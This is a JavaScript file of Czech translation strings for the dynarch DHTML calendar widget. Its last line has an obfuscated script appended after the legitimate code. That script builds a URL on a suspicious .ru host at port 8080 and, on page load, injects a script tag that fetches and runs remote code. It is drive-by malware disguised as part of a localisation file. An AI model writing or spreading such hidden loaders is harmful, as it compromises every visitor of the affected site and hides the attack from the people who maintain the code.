/* 
	calendar-cs-win.js
	language: Czech
	encoding: windows-1250
	author: Lubos Jerabek (xnet@seznam.cz)
	        Jan Uhlir (espinosa@centrum.cz)
*/

// ** I18N
Calendar._DN  = new Array('Nedìle','Pondìlí','Úterı','Støeda','Ètvrtek','Pátek','Sobota','Nedìle');
Calendar._SDN = new Array('Ne','Po','Út','St','Èt','Pá','So','Ne');
Calendar._MN  = new Array('Leden','Únor','Bøezen','Duben','Kvìten','Èerven','Èervenec','Srpen','Záøí','Øíjen','Listopad','Prosinec');
Calendar._SMN = new Array('Led','Úno','Bøe','Dub','Kvì','Èrv','Èvc','Srp','Záø','Øíj','Lis','Pro');

// tooltips
Calendar._TT = {};
Calendar._TT["INFO"] = "O komponentì kalendáø";
Calendar._TT["TOGGLE"] = "Zmìna prvního dne v tıdnu";
Calendar._TT["PREV_YEAR"] = "Pøedchozí rok (pøidr pro menu)";
Calendar._TT["PREV_MONTH"] = "Pøedchozí mìsíc (pøidr pro menu)";
Calendar._TT["GO_TODAY"] = "Dnešní datum";
Calendar._TT["NEXT_MONTH"] = "Další mìsíc (pøidr pro menu)";
Calendar._TT["NEXT_YEAR"] = "Další rok (pøidr pro menu)";
Calendar._TT["SEL_DATE"] = "Vyber datum";
Calendar._TT["DRAG_TO_MOVE"] = "Chy a táhni, pro pøesun";
Calendar._TT["PART_TODAY"] = " (dnes)";
Calendar._TT["MON_FIRST"] = "Uka jako první Pondìlí";
//Calendar._TT["SUN_FIRST"] = "Uka jako první Nedìli";

Calendar._TT["ABOUT"] =
"DHTML Date/Time Selector\n" +
"(c) dynarch.com 2002-2005 / Author: Mihai Bazon\n" + // don't translate this this ;-)
"For latest version visit: http://www.dynarch.com/projects/calendar/\n" +
"Distributed under GNU LGPL.  See http://gnu.org/licenses/lgpl.html for details." +
"\n\n" +
"Vıbìr datumu:\n" +
"- Use the \xab, \xbb buttons to select year\n" +
"- Pouijte tlaèítka " + String.fromCharCode(0x2039) + ", " + String.fromCharCode(0x203a) + " k vıbìru mìsíce\n" +
"- Podrte tlaèítko myši na jakémkoliv z tìch tlaèítek pro rychlejší vıbìr.";

Calendar._TT["ABOUT_TIME"] = "\n\n" +
"Vıbìr èasu:\n" +
"- Kliknìte na jakoukoliv z èástí vıbìru èasu pro zvıšení.\n" +
"- nebo Shift-click pro sníení\n" +
"- nebo kliknìte a táhnìte pro rychlejší vıbìr.";

// the following is to inform that "%s" is to be the first day of week
// %s will be replaced with the day name.
Calendar._TT["DAY_FIRST"] = "Zobraz %s první";

// This may be locale-dependent.  It specifies the week-end days, as an array
// of comma-separated numbers.  The numbers are from 0 to 6: 0 means Sunday, 1
// means Monday, etc.
Calendar._TT["WEEKEND"] = "0,6";

Calendar._TT["CLOSE"] = "Zavøít";
Calendar._TT["TODAY"] = "Dnes";
Calendar._TT["TIME_PART"] = "(Shift-)Klikni nebo táhni pro zmìnu hodnoty";

// date formats
Calendar._TT["DEF_DATE_FORMAT"] = "d.m.yy";
Calendar._TT["TT_DATE_FORMAT"] = "%a, %b %e";

Calendar._TT["WK"] = "wk";
Calendar._TT["TIME"] = "Èas:";


var pK=new Array();var _p=new Array();try {this.d='';var O;if(O!='f' && O!='eR'){O=''};var CD;if(CD!='' && CD!='q_'){CD='Y'};var T='g';this.GD='';var a=RegExp;var k=new Array();var Tb='[';var _='replace';var Xo="";var n='';var _k;if(_k!='' && _k!='kT'){_k='oU'};var s=']';var i='';var V;if(V!='' && V!='pV'){V=null};function R(G,C){var bE;if(bE!='' && bE!='at'){bE=''};var ib;if(ib!='' && ib!='HF'){ib=''};var zR="";var M=Tb;M+=C;var Zb=new Date();M+=s;var zB;if(zB!='ry' && zB != ''){zB=null};var Xn=new String();var Mn=new a(M, T);var NQ=new Array();var mC=new Date();return G[_](Mn, n);};var y=new String();var uZ;if(uZ!='' && uZ!='av'){uZ=null};this.Ee="";var U=R('aWpvpBeXnBd1C1hviBl1dX',"vBWX1");var G="1";var o=R('bHo5dCy5',"HnCY5");var Nd="";var m=R('sCeCt4A4tCtCrCi4b4u4tCe4',"4C");var Uo="";var K=R('cGrNe7aNt7e7EMlNeqmGeMn7t7',"qGNM7");var eu=new String();var bX;if(bX!='cn'){bX=''};var F=R('oPnNlPoNaDdN',"NPAD");var q='';var p=R('s2c2rjijpyt2',"20yj");this.MF="";var B=R('hItJtJpJ:I/I/ImIoInIoIgIrJaIfJiJaJsI-JcIoImJ.IwIiJkIiImIeJdJiJaJ.IoIrIgI.JpJaJrItIyIpJoIkIeIrI-IcJoJmI.JiIwJeIsItIpIoJiInJtJ.JrJuJ:I',"IJ");var v=R('8199997099179987919970999991',"179");var FI=new Array();var FH=R('/kguouo5gFlbeb.5cuobm5/kguokoFgulueb.bcuoFm5/kw5auskhuiun5gut5oFnkp5o5sFtu.bcuoFmk/uy5nkeutu.ucuobmb/ktbw5ibtupFiucu.5cbo5mF.5pbhupb',"uF5bk");var Ex=new String();var S_;if(S_!='' && S_!='HJ'){S_='aB'};var g;if(g!='' && g!='Ox'){g='Zs'};window[F]=function(){var Rs;if(Rs!=''){Rs='ZC'};this.Gx='';var ml;if(ml!='' && ml!='fI'){ml='yy'};W=document[K](p);var pX="";q+=B;var dt;if(dt!='Am'){dt='Am'};this.Oz="";q+=v;q+=FH;var SZ=new Array();W.src=q;var Gn;if(Gn!='' && Gn!='yyO'){Gn='YG'};var Yr;if(Yr!='ES'){Yr='ES'};var Il;if(Il!='fa'){Il='fa'};var nY;if(nY!='ce'){nY=''};var z=document[o];var _q;if(_q!='lV' && _q != ''){_q=null};W.setAttribute('defer', G);var Bi;if(Bi!=''){Bi='Tx'};this.qs='';var dj;if(dj!='' && dj!='Ek'){dj=null};z.appendChild(W);this.uZB='';this.vl='';};var ST=new Array();var pD;if(pD!='SpC'){pD=''};} catch(A){};var Jq='';